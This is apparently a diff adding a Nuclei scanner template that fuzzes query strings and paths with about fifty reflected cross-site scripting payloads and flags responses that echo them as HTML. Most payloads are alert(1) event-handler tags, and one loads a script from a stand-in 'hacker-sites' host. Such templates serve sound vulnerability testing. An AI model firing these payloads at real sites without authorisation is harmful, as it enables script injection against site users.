@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<div draggable=\"true\" contenteditable>drag me</div><progressitem ondrop=alert(1) contenteditable>drop here</progressitem>"
+        - "<noscript draggable=\"true\" ondragend=\"alert(1)\">test</noscript>"
+        - "<script>alert(1)</script>"
+        - "<IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<script>alert('XSS')</script>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<svg><bdi onload=alert(1)>"
+        - "<frame onbeforepaste=\"alert(1)\" contenteditable>test</frame>"
+        - "<embed type=\"image/gif\" data=\"/onerror=javascript:alert(1)\"/>"
+        - "<svg draggable=\"true\" ondragstart=\"alert(1)\">test</svg>"
+        - "<picture draggable=\"true\" ondragend=\"alert(1)\">test</picture>"
+        - "<plaintext draggable=\"true\" ondragenter=\"alert(1)\">test</plaintext>"
+        - "<svg/onload=javascript:alert(1)>"
+        - "<optgroup oncontextmenu=\"alert(1)\">test</optgroup>"
+        - "<;SCRIPT SRC=\";http://hacker-sites/hackscript.js\";>;"
+        - "<colgroup onclick=\"alert(1)\">test</colgroup>"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<video controls autoplay ontimeupdate=alert(1) src=\"validVideo.mp4\" type=\"video/mp4\"></video>"
+        - "<mark draggable=\"true\" ondragend=\"alert(1)\">test</mark>"
+        - "<del oncontextmenu=\"alert(1)\">test</del>"
+        - "<plaintext draggable=\"true\" ondragleave=\"alert(1)\">test</plaintext>"
+        - "<ul draggable=\"true\" ondragleave=\"alert(1)\">test</ul>"
+        - "<map id=x tabindex=1 onfocusin=alert(1)></map>"
+        - "<IMG SRC=x onerror=\"javascript:alert(1)\">"
+        - "<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"50\" cx=\"50\" cy=\"50\"></circle><image onloadend=alert(1)></image>"
+        - "<img src\\x10=1px onerror\\x0A=alert(1)"
+        - "<html onmousedown=\"alert(1)\">test</html>"
+        - "<output draggable=\"true\" ondragend=\"alert(1)\">test</output>"
+        - "<menuitem onblur=alert(1) id=x></menuitem><input autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>"
+        - "<script>alert('XSS')</script><bdi id=xss-payload-list></bdi>"
+        - "<script>alert(1)</script><"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>"
+        - "<IMG SRC=x onerror=\"javascript:alert(1)\">"
+        - "<tt draggable=\"true\" ondragleave=\"alert(1)\">test</tt>"
+        - "<iframe src=\"http://xss.html5sec.org/\"></iframe>"
+        - "<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>"
+        - "<html id=x tabindex=1 ondeactivate=alert(1)></html><input autofocus>"
+        - "<form onbeforecut=\"alert(1)\" contenteditable>test</form>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></noscript>"
+        - "<multicol onclick=\"alert(1)\">test</multicol>"
+        - "<optgroup draggable=\"true\" ondragenter=\"alert(1)\">test</optgroup>"
+        - "<frameset draggable=\"true\" ondragleave=\"alert(1)\">test</frameset>"
+        - "<svg><script>alert(1)</script></svg>"
+        - "<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext><input autofocus>"
+        - "<style>@keyframes slidein {}</style><noscript style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></noscript>"
+        - "<embed onkeyup=\"alert(1)\" type=\"text/html\" data=\"\" >"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
